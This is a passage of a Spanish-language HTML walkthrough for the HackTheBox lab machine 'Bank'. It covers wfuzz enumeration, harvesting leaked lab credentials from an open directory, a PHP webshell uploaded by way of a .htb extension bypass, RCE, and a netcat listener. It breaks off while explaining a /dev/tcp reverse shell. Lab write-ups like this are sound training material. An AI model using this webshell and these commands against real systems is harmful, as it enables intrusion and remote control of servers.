+          <strong>22 (SSH)</strong> con OpenSSH 6.6.1p1 — versión antigua, posibles CVEs conocidos.
+          <strong>53 (DNS)</strong> con ISC BIND — el servidor corre su propio servicio DNS, lo que
+          sugiere que usa un dominio virtual (<code>bank.htb</code>).
+          <strong>80 (HTTP)</strong> con Apache 2.4.7 mostrando la página por defecto de Ubuntu —
+          indica que hay un virtual host que necesitamos configurar manualmente.
+        </p>
+      </div>
+
+      <div class="prose">
+        <p>
+          Al acceder a <code style="color:var(--yellow);font-family:var(--font-mono)">http://10.129.3.73</code>
+          directamente por IP, el servidor muestra la <strong>página por defecto de Apache2 Ubuntu</strong>.
+          Esto es una señal importante: Apache está usando
+          <span class="hl-cyan">virtual hosting</span>, lo que significa que responde de forma
+          diferente según el nombre de dominio en el header <code style="color:var(--yellow);font-family:var(--font-mono)">Host:</code>.
+          Para acceder al contenido real debemos usar el dominio <span class="hl">bank.htb</span>.
+        </p>
+        <p>
+          Probamos conectividad hacia <span class="hl-cyan">bank.htb</span> con ping para verificar
+          si el DNS público conoce ese dominio:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping bank.htb -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VERIFICACIÓN DNS</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">bank.htb</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">ping: bank.htb: Name or service not known</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// NOTA IMPORTANTE</p>
+        <p>
+          El error <strong>"Name or service not known"</strong> confirma que el DNS público de
+          internet no tiene registro para <code>bank.htb</code>. Esto es esperado en HackTheBox:
+          los dominios <code>.htb</code> son locales a la red de laboratorio y no existen en
+          servidores DNS públicos. La solución es agregar la entrada manualmente al archivo
+          <code>/etc/hosts</code>, que actúa como un resolver DNS local con mayor prioridad
+          que los servidores externos.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 03 DNS LOCAL ===================== -->
+    <div class="section" id="dns">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Configuración DNS Local</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">EDITAR /etc/hosts</span>
+      </div>
+      <div class="prose">
+        <p>
+          El archivo <code style="color:var(--yellow);font-family:var(--font-mono)">/etc/hosts</code>
+          es el <strong>DNS local del sistema operativo</strong>. Cuando se ingresa un dominio en
+          el navegador, el SO primero consulta este archivo antes de recurrir a servidores DNS
+          externos. Si encuentra una entrada, usa esa IP directamente sin consultar la red.
+          Agregamos la línea <code style="color:var(--yellow);font-family:var(--font-mono)">10.129.3.73 bank.htb</code>
+          para que cualquier petición a <span class="hl-cyan">bank.htb</span> sea redirigida
+          automáticamente a la IP de la máquina objetivo. Necesitamos
+          <span class="hl-red">sudo</span> porque es un archivo del sistema, de solo lectura
+          para usuarios normales.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nano /etc/hosts">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DNS LOCAL</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nano <span class="arg">/etc/hosts</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>127.0.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localhost</div>
+        <div>127.0.1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kali</div>
+        <div>::1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localhost ip6-localhost ip6-loopback</div>
+        <div>ff02::1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ip6-allnodes</div>
+        <div>ff02::2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ip6-allrouters</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">10.129.3.73&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bank.htb</span>&nbsp;&nbsp;&nbsp;<span class="o-yellow">&lt;--- línea añadida</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">VERIFICAR CONECTIVIDAD CON PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          Verificamos que el sistema ahora resuelve <span class="hl-cyan">bank.htb</span>
+          correctamente hacia la IP de la máquina. El flag <span class="hl-cyan">-c 3</span>
+          limita el ping a exactamente <strong>3 paquetes ICMP</strong> (sin él, el ping
+          continuaría indefinidamente). Si vemos paquetes enviados y recibidos sin pérdida,
+          la configuración es correcta.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping bank.htb -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VERIFICACIÓN</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">bank.htb</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING bank.htb (<span class="o-cyan">10.129.3.73</span>) 56(84) bytes of data.</div>
+        <div><span class="o-green">64 bytes from bank.htb (10.129.3.73): icmp_seq=1 ttl=63 time=118 ms</span></div>
+        <div><span class="o-green">64 bytes from bank.htb (10.129.3.73): icmp_seq=2 ttl=63 time=105 ms</span></div>
+        <div><span class="o-green">64 bytes from bank.htb (10.129.3.73): icmp_seq=3 ttl=63 time=104 ms</span></div>
+        <div>&nbsp;</div>
+        <div>--- bank.htb ping statistics ---</div>
+        <div><span class="o-green">3 packets transmitted, 3 received, 0% packet loss</span>, time 2011ms</div>
+        <div>rtt min/avg/max/mdev = 104.298/109.233/118.223/6.367 ms</div>
+      </div>
+
+      <div class="prose">
+        <p>
+          Ahora podemos acceder a <span class="hl-cyan">http://bank.htb</span> en el navegador.
+          El servidor redirige automáticamente a
+          <code style="color:var(--yellow);font-family:var(--font-mono)">bank.htb/login.php</code>,
+          presentando el panel de login de <strong>HTB Bank</strong> con campos para email
+          y contraseña. Esto confirma que el virtual host está correctamente configurado y
+          que el contenido real de la aplicación está disponible solo bajo el dominio
+          <span class="hl">bank.htb</span>.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 04 ENUMERACION WEB ===================== -->
+    <div class="section" id="enumeracion">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Enumeración Web · wfuzz</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">FUZZING CON WFUZZ — PRIMERA PASADA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el dominio accesible, procedemos a enumerar directorios y archivos ocultos usando
+          <span class="hl-cyan">wfuzz</span>, una herramienta de fuzzing web. La idea es
+          sustituir la palabra <code style="color:var(--yellow);font-family:var(--font-mono)">FUZZ</code>
+          en la URL por cada línea del diccionario y analizar las respuestas del servidor.
+        </p>
+        <p>
+          <span class="hl-cyan">-c</span> activa la salida con <strong>colores</strong> para
+          facilitar la lectura. <span class="hl-cyan">-hc=302</span> significa
+          <strong>hide code 302</strong>: oculta todas las respuestas con código HTTP 302
+          (redirecciones), que en este caso corresponden a páginas protegidas que redirigen
+          al login — no son útiles para nosotros en esta fase.
+          <span class="hl-cyan">-t 200</span> define <strong>200 hilos concurrentes</strong>
+          (threads), acelerando considerablemente el proceso.
+          <span class="hl-cyan">-w</span> especifica el <strong>wordlist (diccionario)</strong>
+          a usar: <code style="color:var(--yellow);font-family:var(--font-mono)">dirbuster-2007_directory-list-2.3-medium.txt</code>,
+          un diccionario clásico con miles de rutas comunes.
+          La URL con <code style="color:var(--yellow);font-family:var(--font-mono)">FUZZ</code>
+          al final indica el punto de inyección donde wfuzz sustituirá cada palabra del diccionario.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="wfuzz -c -hc=302 -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt http://bank.htb/FUZZ.php">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FUZZING · ARCHIVOS PHP</span>
+        <div><span class="prompt">$ </span><span class="cmd">wfuzz <span class="flag">-c</span> <span class="flag">-hc=302</span> <span class="flag">-t 200</span> <span class="flag">-w</span> <span class="arg">/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt</span> <span class="arg">http://bank.htb/FUZZ.php</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Target: http://bank.htb/FUZZ.php</div>
+        <div>Total requests: 220559</div>
+        <div>&nbsp;</div>
+        <div>ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response&nbsp;&nbsp; Lines&nbsp;&nbsp; Word&nbsp;&nbsp; Chars&nbsp;&nbsp;&nbsp; Payload</div>
+        <div>═══════════════════════════════════════════════════════════════════════════</div>
+        <div>00000053:&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 91 L&nbsp;&nbsp;&nbsp; 125 W&nbsp;&nbsp; 1974 Ch&nbsp;&nbsp; <span class="o-yellow">"login"</span></div>
+        <div>00001225:&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8 L&nbsp;&nbsp;&nbsp;&nbsp; 1 W&nbsp;&nbsp;&nbsp;&nbsp; 0 Ch&nbsp;&nbsp;&nbsp;&nbsp; <span class="o-yellow">"logout"</span></div>
+        <div>00001248:&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10 L&nbsp;&nbsp;&nbsp; 1 W&nbsp;&nbsp;&nbsp;&nbsp; 30 W&nbsp;&nbsp;&nbsp;&nbsp; <span class="o-yellow">"support"</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">WFUZZ — SEGUNDA PASADA (DIRECTORIOS)</span>
+      </div>
+      <div class="prose">
+        <p>
+          En una segunda pasada enumeramos <strong>directorios</strong> (sin extensión), usando
+          el mismo diccionario pero apuntando a la raíz del dominio. Esta vez ocultamos respuestas
+          con código <span class="hl-yel">301</span> (redirección a directorio con slash) para
+          reducir ruido, y con <span class="hl-yel">302</span> para ignorar los redirects de
+          autenticación. El objetivo es encontrar rutas que respondan
+          <span class="hl-green">200 OK</span> directamente o que expongan contenido sin
+          requerir login.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="wfuzz -c -hc=302 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FUZZING · DIRECTORIOS</span>
+        <div><span class="prompt">$ </span><span class="cmd">wfuzz <span class="flag">-c</span> <span class="flag">-hc=302</span> <span class="flag">-t 200</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <span class="arg">http://bank.htb/FUZZ</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Target: http://bank.htb/FUZZ</div>
+        <div>Total requests: 220560</div>
+        <div>&nbsp;</div>
+        <div>ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response&nbsp;&nbsp; Lines&nbsp;&nbsp; Word&nbsp;&nbsp; Chars&nbsp;&nbsp;&nbsp; Payload</div>
+        <div>═══════════════════════════════════════════════════════════════════════════</div>
+        <div>00000291:&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9 L&nbsp;&nbsp;&nbsp;&nbsp; 20 W&nbsp;&nbsp; 304 Ch&nbsp;&nbsp; <span class="o-yellow">"assets"</span></div>
+        <div>00002190:&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5 L&nbsp;&nbsp;&nbsp;&nbsp; 20 W&nbsp;&nbsp; 301 Ch&nbsp;&nbsp; <span class="o-yellow">"uploads"</span></div>
+        <div>00095524:&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10 L&nbsp;&nbsp;&nbsp; 28 W&nbsp;&nbsp; 288 Ch&nbsp;&nbsp; <span class="o-yellow">"server-status"</span></div>
+        <div>00819277:&nbsp;&nbsp; <span class="o-green">200</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10 L&nbsp;&nbsp;&nbsp; 28 W&nbsp;&nbsp; 314 Ch&nbsp;&nbsp; <span class="o-cyan">&#34;balance-transfer&#34;</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// HALLAZGO CLAVE</p>
+        <p>
+          El directorio <strong>/balance-transfer</strong> responde con código 200 y tiene
+          <strong>directory listing habilitado</strong>, lo que significa que el servidor nos
+          muestra el listado completo de archivos en ese directorio sin necesidad de autenticación.
+          Esto es una misconfiguration grave: archivos sensibles quedan expuestos directamente.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 05 BALANCE-TRANSFER LEAK ===================== -->
+    <div class="section" id="leak">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Balance-Transfer · Filtración de Credenciales</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">DIRECTORY LISTING EN /balance-transfer/</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al acceder a <code style="color:var(--yellow);font-family:var(--font-mono)">http://bank.htb/balance-transfer/</code>
+          el servidor muestra un listado de cientos de archivos <code style="color:var(--yellow);font-family:var(--font-mono)">.acc</code>.
+          Estos parecen ser registros de transferencias bancarias, supuestamente cifrados.
+          Sin embargo, la hipótesis es que alguno de estos archivos pudo haber <strong>fallado
+          en el proceso de cifrado</strong>, dejando los datos en texto plano. Buscar
+          manualmente entre cientos de archivos es inviable, así que automatizamos la búsqueda.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">FILTRAR EL ARCHIVO CON ERR ENCRYPT FAILED</span>
+      </div>
+      <div class="prose">
+        <p>
+          Usamos una cadena de comandos en bash para automatizar la búsqueda del archivo
+          anómalo. La idea es descargar el HTML del directorio con
+          <span class="hl-cyan">curl</span>, procesarlo con
+          <span class="hl-cyan">awk</span> para extraer el nombre del archivo y su tamaño
+          en bytes, y filtrar con <span class="hl-cyan">grep</span> los que tengan un
+          tamaño inusualmente pequeño (indicativo de contenido en texto plano vs. cifrado).
+        </p>
+        <p>
+          <span class="hl-cyan">curl http://bank.htb/balance-transfer/</span> descarga el
+          HTML del listado del directorio. El pipe
+          <code style="color:var(--yellow);font-family:var(--font-mono)">|</code> pasa la
+          salida al siguiente comando.
+          <span class="hl-cyan">awk '{print$6 " ---> " $10}'</span> extrae el
+          <strong>campo 6</strong> (nombre del archivo como enlace HTML) y el
+          <strong>campo 10</strong> (tamaño en bytes) de cada línea — awk divide por espacios
+          por defecto. <span class="hl-cyan">tr -d '"'</span> elimina las comillas del HTML.
+          <span class="hl-cyan">grep "align=right&gt;2"</span> filtra las líneas donde el
+          tamaño comienza con "2" seguido de pocos dígitos, lo que representa archivos
+          <strong>muy pequeños</strong> (el resto tiene tamaños de 584 bytes, los cifrados;
+          el anómalo tiene apenas ~257 bytes).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd='curl http://bank.htb/balance-transfer/ | awk '"'"'{print$6 " ---> " $10}'"'"' | tr -d '"'"'"'"'"' | grep "align=right>2"'>
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FILTRADO</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">http://bank.htb/balance-transfer/</span> | awk <span class="arg">'{print$6 " ---> " $10}'</span> | tr <span class="flag">-d</span> <span class="arg">'"'</span> | grep <span class="arg">"align=right&gt;2"</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>  % Total&nbsp;&nbsp;&nbsp; % Received % Xferd&nbsp; Average Speed&nbsp;&nbsp; Time&nbsp;&nbsp;&nbsp; Time&nbsp;&nbsp;&nbsp;&nbsp; Time&nbsp;&nbsp; Current</div>
+        <div>100 140.5k&nbsp;&nbsp; 0 140.5k&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6930&nbsp;&nbsp; 0:00:03&nbsp; 0:00:03 --:--:-- &nbsp;&nbsp;&nbsp; 6930</div>
+        <div>&nbsp;</div>
+        <div>href=<span class="o-cyan">"68576f20e9732f1b2edc4df5b8533230.acc"</span> ---&gt; <span class="o-yellow">align=right&gt;257</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">LEER EL ARCHIVO FILTRADO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Accedemos directamente al archivo identificado. Al estar en texto plano por el fallo
+          de cifrado, obtenemos toda la información del usuario incluyendo su contraseña en
+          claro:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="curl http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LEER ARCHIVO</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">--ERR ENCRYPT FAILED</span></div>
+        <div>+===================+</div>
+        <div>| HTB Bank Report&nbsp;&nbsp; |</div>
+        <div>+===================+</div>
+        <div>&nbsp;</div>
+        <div>===UserAccount===</div>
+        <div>Full Name: <span class="o-white">Christos Christopoulos</span></div>
+        <div>Email: <span class="o-cyan">chris@bank.htb</span></div>
+        <div>Password: <span class="o-green">!!##HTBB4nkP4ssw0rd!##</span></div>
+        <div>CreditCards: 5</div>
+        <div>Transactions: 39</div>
+        <div>Balance: 8842803</div>
+        <div>===UserAccount===</div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// VULNERABILIDAD — CLEAR TEXT CREDENTIALS EN ALMACENAMIENTO</p>
+        <p>
+          El archivo de transferencia falló en el proceso de cifrado y almacenó los datos en
+          texto plano. Esto expone credenciales reales de usuario directamente accesibles por
+          cualquiera que encuentre el directorio. La falta de autenticación en
+          <strong>/balance-transfer/</strong> agrava el problema: el directory listing público
+          permite indexar y descargar todos los archivos sin restricción alguna.
+        </p>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">EMAIL</div>
+          <div class="cred-val">chris@bank.htb</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">PASSWORD</div>
+          <div class="cred-val">!!##HTBB4nkP4ssw0rd!##</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 06 ACCESO AL PANEL ===================== -->
+    <div class="section" id="acceso">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Acceso al Panel Bancario</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">LOGIN EN bank.htb</span>
+      </div>
+      <div class="prose">
+        <p>
+          Usamos las credenciales obtenidas para autenticarnos en
+          <code style="color:var(--yellow);font-family:var(--font-mono)">http://bank.htb/login.php</code>.
+          El sistema acepta el email <span class="hl-cyan">chris@bank.htb</span> y la contraseña
+          <span class="hl">!!##HTBB4nkP4ssw0rd!##</span>, mostrando el panel bancario del
+          usuario <strong>Christos Christopoulos</strong>.
+        </p>
+        <p>
+          El dashboard muestra un balance de <strong>1.337 $</strong> (guiño al término
+          hacker "leet"), 8 transacciones, 2 tarjetas de crédito y 0 tickets de soporte.
+          Lo que más nos interesa es la sección <span class="hl-yel">Support</span> en el
+          menú lateral, donde se puede crear un ticket y adjuntar un archivo.
+        </p>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// SIGUIENTE OBJETIVO</p>
+        <p>
+          La sección <strong>Support → My Tickets</strong> permite adjuntar archivos a un
+          ticket de soporte. Si el servidor no valida correctamente el tipo de archivo subido,
+          podríamos subir una <strong>webshell PHP</strong> y obtener ejecución remota de
+          comandos (RCE). Esta es la técnica conocida como <strong>Arbitrary File Upload</strong>.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 07 FILE UPLOAD ===================== -->
+    <div class="section" id="upload">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">File Upload · Bypass con extensión .htb</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">CREAR LA WEBSHELL PHP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Creamos un archivo PHP malicioso que actúa como <strong>webshell</strong>: recibe
+          un parámetro <code style="color:var(--yellow);font-family:var(--font-mono)">cmd</code>
+          desde la URL y lo ejecuta en el sistema. La función
+          <span class="hl-cyan">shell_exec()</span> ejecuta el comando recibido y retorna
+          el resultado completo como string. Las etiquetas
+          <code style="color:var(--yellow);font-family:var(--font-mono)">&lt;pre&gt;</code>
+          preservan el formato (espacios, saltos de línea) de la salida en el navegador.
+          <span class="hl-cyan">$_REQUEST['cmd']</span> captura el parámetro
+          <code>cmd</code> ya sea por GET o POST.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="echo '<?php echo &quot;<pre>&quot; . shell_exec($_REQUEST[&quot;cmd&quot;]) . &quot;</pre>&quot;; ?>' > shell.php">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CREAR WEBSHELL</span>
+        <div><span class="prompt">$ </span><span class="cmd">nano <span class="arg">shell.php</span></span></div>
+        <div><span class="comment"># Contenido del archivo:</span></div>
+        <div><span class="arg">&lt;?php</span></div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">echo</span> <span class="arg">"&lt;pre&gt;"</span> . <span class="flag">shell_exec</span>(<span class="arg">$_REQUEST['cmd']</span>) . <span class="arg">"&lt;/pre&gt;"</span>;</div>
+        <div><span class="arg">?&gt;</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">INTENTAR SUBIR shell.php — BLOQUEADO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al intentar subir el archivo <code style="color:var(--yellow);font-family:var(--font-mono)">shell.php</code>
+          directamente, el servidor responde con un modal de error:
+          <span class="hl-red">"You can't upload this file. You can only upload images."</span>
+          El servidor tiene algún tipo de validación que rechaza archivos PHP. Sin embargo,
+          esta validación puede estar en el <strong>lado del cliente</strong> (JavaScript) o
+          ser una validación superficial en el servidor. Usamos
+          <span class="hl-cyan">Burp Suite</span> para interceptar y analizar la petición.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">INTERCEPTAR CON BURP SUITE Y DESCUBRIR COMENTARIO DEBUG</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con Burp Suite interceptamos la petición de subida y la enviamos al
+          <span class="hl-cyan">Repeater</span> (<code style="color:var(--yellow);font-family:var(--font-mono)">Ctrl+R</code>)
+          para modificarla y reenviarla sin que el navegador interfiera. Al revisar la
+          <strong>respuesta del servidor</strong> (pestaña Response) en el código HTML,
+          encontramos un comentario de depuración revelador:
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow">&lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&gt;</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// VULNERABILIDAD — COMENTARIO DEBUG EN PRODUCCIÓN</p>
+        <p>
+          Un desarrollador dejó en el código fuente HTML un comentario de depuración que revela
+          que la extensión <strong>.htb</strong> es tratada por el servidor como PHP. Este tipo
+          de configuración se añade en entornos de desarrollo para pruebas y
+          <strong>nunca debería llegar a producción</strong>. Al dejar este comentario en el
+          código, el atacante sabe exactamente qué extensión usar para evadir el filtro.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">RENOMBRAR A .htb Y SUBIR LA WEBSHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Renombramos el archivo para usar la extensión descubierta. El comando
+          <span class="hl-cyan">mv</span> mueve/renombra el archivo:
+          <code style="color:var(--yellow);font-family:var(--font-mono)">shell.php</code>
+          pasa a llamarse <code style="color:var(--yellow);font-family:var(--font-mono)">shell.htb</code>.
+          Confirmamos con <span class="hl-cyan">ls</span> que el archivo existe con el nuevo
+          nombre, y lo subimos a través del formulario de Support.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="mv shell.php shell.htb && ls">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">RENOMBRAR</span>
+        <div><span class="prompt">$ </span><span class="cmd">mv <span class="arg">shell.php</span> <span class="arg">shell.htb</span> &amp;&amp; ls</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">shell.htb</span></div>
+      </div>
+
+      <div class="prose">
+        <p>
+          Subimos <code style="color:var(--yellow);font-family:var(--font-mono)">shell.htb</code>
+          a través del formulario de Support. Esta vez el servidor lo acepta sin error,
+          mostrando el modal <span class="hl-green">Success: "Your ticket has been created successfully"</span>.
+          El archivo queda almacenado en el directorio
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/uploads/</code>
+          que habíamos descubierto con wfuzz.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 08 RCE ===================== -->
+    <div class="section" id="rce">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">RCE · Reverse Shell</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">VERIFICAR RCE CON WHOAMI</span>
+      </div>
+      <div class="prose">
+        <p>
+          Accedemos directamente al archivo subido a través del navegador usando el parámetro
+          <code style="color:var(--yellow);font-family:var(--font-mono)">?cmd=</code>.
+          El servidor interpreta el archivo <code>.htb</code> como PHP y ejecuta el comando.
+          Empezamos con <span class="hl-cyan">whoami</span> para identificar con qué usuario
+          del sistema está corriendo el servidor web:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="curl http://bank.htb/uploads/shell.htb?cmd=whoami">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VERIFICAR RCE</span>
+        <div><span class="comment"># URL en el navegador:</span></div>
+        <div><span class="arg">http://bank.htb/uploads/shell.htb?cmd=whoami</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">www-data</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// RCE CONFIRMADO</p>
+        <p>
+          El servidor ejecuta comandos bajo el usuario <strong>www-data</strong>, que es el
+          usuario estándar de Apache en sistemas Ubuntu. Tenemos ejecución remota de comandos.
+          El siguiente paso es obtener una <strong>reverse shell</strong> interactiva para
+          tener control completo del sistema.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">PREPARAR LISTENER CON NETCAT</span>
+      </div>
+      <div class="prose">
+        <p>
+          En nuestra máquina abrimos un <strong>listener</strong> con
+          <span class="hl-cyan">netcat</span> para recibir la conexión inversa.
+          <span class="hl-cyan">-l</span> indica modo listen (escuchar conexiones entrantes).
+          <span class="hl-cyan">-v</span> activa el modo verbose para ver los eventos de
+          conexión. <span class="hl-cyan">-n</span> desactiva la resolución DNS.
+          <span class="hl-cyan">-p 443</span> especifica el puerto de escucha — usamos 443
+          porque en muchos entornos el tráfico saliente al puerto 443 (HTTPS) no está filtrado
+          por firewalls.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nc -lvnp 443">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LISTENER</span>
+        <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>listening on [any] 443 ...</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">16</div>
+        <span class="step-title">ENVIAR REVERSE SHELL DESDE LA WEBSHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos el payload de reverse shell a través del parámetro
+          <code style="color:var(--yellow);font-family:var(--font-mono)">?cmd=</code>.
+          Dado que la URL no puede contener ciertos caracteres especiales, los codificamos
+          en formato <span class="hl-cyan">URL encoding</span>:
+          <code style="color:var(--yellow);font-family:var(--font-mono)">%3E%26</code>
+          representa <code>&gt;&amp;</code> (redirección combinada de stdout y stderr) y
+          <code style="color:var(--yellow);font-family:var(--font-mono)">0%3E%261</code>
+          representa <code>0&gt;&amp;1</code> (redirigir stdin al mismo socket).
+          El mecanismo <code style="color:var(--yellow);font-family:var(--font-mono)">/dev/tcp/IP/PUERTO</code>
+          es una característica especial de bash que abre un socket TCP hacia la IP y puerto
+          especificados. <span class="hl-cyan">bash -i</span> lanza bash en modo interactivo.
+          Combinado, el comando inicia bash, redirige stdin/stdout/stderr al socket TCP y
